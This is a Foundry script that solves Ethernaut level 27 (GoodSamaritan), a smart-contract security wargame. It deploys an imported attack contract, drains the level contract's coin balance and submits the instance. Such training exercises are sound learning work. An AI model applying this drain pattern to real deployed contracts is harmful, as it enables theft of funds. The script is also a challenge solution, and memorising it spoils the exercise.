// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { GoodSamaritan, Coin } from "src/Level27.sol";
import { L27Attack } from "src/Level27Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = uint256(vm.envBytes32("DEPLOYER_PRIVATE_KEY"));
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0x36E92B2751F260D6a4749d7CA58247E7f8198284);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);

        GoodSamaritan samaritan = GoodSamaritan(instanceAddress);
        L27Attack attack = new L27Attack(samaritan);
        attack.attack();
        Coin coin = Coin(address(samaritan.coin()));
        require(coin.balances(address(samaritan)) == 0, "attack failed");

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
